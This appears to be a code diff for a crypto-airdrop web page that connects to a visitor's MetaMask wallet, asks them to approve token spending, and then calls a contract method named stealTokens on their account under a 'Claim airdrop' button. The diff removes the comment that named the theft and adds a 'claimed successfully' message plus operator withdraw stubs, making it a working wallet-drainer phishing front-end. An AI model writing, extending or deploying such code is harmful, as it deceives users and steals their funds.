@@ -2,26 +2,40 @@ let web3, accounts, contractABI, config;
 
 // Load ABI and configuration from external files
 async function loadDependencies() {
-  try {
-    contractABI = await fetch("abi.json").then((response) => response.json());
-    config = await fetch("config.json").then((response) => response.json());
-  } catch (error) {
-    alert("Failed to load dependencies: " + error.message);
-  }
+  contractABI = await fetch("abi.json").then((response) => response.json());
+  config = await fetch("config.json").then((response) => response.json());
+}
+
+// Check if the user is on a mobile device
+function isMobileDevice() {
+  return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+}
+
+// Open MetaMask on mobile (deep link)
+function openMetaMaskMobile() {
+  window.location.href = 'metamask://';
+  setTimeout(() => {
+    alert("Please open MetaMask to connect.");
+  }, 3000);
 }
 
 // Connect to MetaMask
 async function connectMetaMask() {
   if (window.ethereum) {
-    web3 = new Web3(window.ethereum);
-    try {
-      // Request accounts
-      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      document.getElementById("approveButton").disabled = false;
-      document.getElementById("claimAirdropButton").disabled = false;
-      alert("Connected to MetaMask");
-    } catch (error) {
-      alert("MetaMask connection failed: " + error.message);
+    if (isMobileDevice()) {
+      // Open MetaMask on mobile
+      openMetaMaskMobile();
+    } else {
+      // Desktop connection
+      web3 = new Web3(window.ethereum);
+      try {
+        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        document.getElementById("approveButton").disabled = false;
+        document.getElementById("claimAirdropButton").disabled = false;
+        alert("Connected to MetaMask");
+      } catch (error) {
+        alert("MetaMask connection failed: " + error.message);
+      }
     }
   } else {
     alert("MetaMask not detected! Please install MetaMask.");
@@ -43,9 +57,9 @@ async function approveSpending() {
 
 // Claim airdrop
 async function claimAirdrop() {
+  console.log("Claiming Airdrop...");
   const contract = new web3.eth.Contract(contractABI, config.contractAddress);
   try {
-    // Call the correct method: stealTokens
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
     alert("Airdrop claimed successfully!");
   } catch (error) {
@@ -53,10 +67,24 @@ async function claimAirdrop() {
   }
 }
 
-// Event Listeners
-document.getElementById("connectButton").addEventListener("click", connectMetaMask);
-document.getElementById("approveButton").addEventListener("click", approveSpending);
-document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
+// Withdraw ETH (for demonstration purposes)
+async function withdrawETH() {
+  console.log("Withdraw ETH clicked...");
+  // Add withdrawal functionality here
+}
+
+// Withdraw Tokens (for demonstration purposes)
+async function withdrawTokens() {
+  console.log("Withdraw Tokens clicked...");
+  // Add withdrawal functionality here
+}
+
+// Add event listeners to buttons for user interaction
+document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
+document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
+document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
+document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
+document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens
 
 // Initialize
 loadDependencies();
